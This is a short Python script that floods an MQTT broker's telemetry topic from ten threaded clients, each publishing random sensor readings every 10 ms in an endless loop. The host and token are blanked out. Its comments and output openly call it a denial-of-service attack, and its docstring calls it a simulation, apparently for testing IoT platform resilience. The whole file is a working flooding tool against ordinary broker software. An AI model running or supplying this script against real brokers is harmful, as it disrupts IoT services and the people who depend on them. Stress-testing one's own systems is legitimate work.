import paho.mqtt.client as mqtt
import time, random, json
import threading

TOKEN = "............."
HOST = "............." 
TOPIC = "v1/devices/me/telemetry"  # Topic being flooded

# The callback for when the client receives a CONNACK response from the server.
def on_connect(client, userdata, flags, rc, *extra_params):
    if rc == 0:
        print(f'Client {client._client_id} connected successfully to MQTT broker.')
    else:
        print(f'Client {client._client_id} failed to connect, return code {rc}')

# The callback for when a PUBLISH message is acknowledged (PUBACK).
def on_publish(client, userdata, mid):
    print(f'Client {client._client_id} - Publish acknowledged (PUBACK) for message ID: {mid}')

def flood_mqtt(client_id):
    """
    Simulates a DoS attack by publishing a high volume of messages.
    """
    client = mqtt.Client(client_id)
    client.on_connect = on_connect
    client.on_publish = on_publish
    client.username_pw_set(TOKEN)
    client.connect(HOST, 1883, 60)
    client.loop_start()

    try:
        while True:
            payload = {
                'temperature': random.uniform(20, 30),
                'shaking': random.uniform(0, 10),
                'random_data': random.random()
            }
            result = client.publish(TOPIC, json.dumps(payload), qos=1)
            status = result.rc
            if status == mqtt.MQTT_ERR_SUCCESS:
                print(f"Client {client_id} sent: {payload}")
            else:
                print(f"Client {client_id} failed to send message.")
            time.sleep(0.01)  # Very short delay to simulate flooding
    except KeyboardInterrupt:
        print(f"Client {client_id} stopping...")
    finally:
        client.loop_stop()
        client.disconnect()

# Main function to start multiple clients for the DoS attack
if __name__ == "__main__":
    NUM_CLIENTS = 10  # Number of simultaneous clients simulating the DoS attack
    threads = []

    print(f"Starting DoS attack with {NUM_CLIENTS} clients...")
    for i in range(NUM_CLIENTS):
        thread = threading.Thread(target=flood_mqtt, args=(f"attacker_{i}",))
        thread.start()
        threads.append(thread)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()
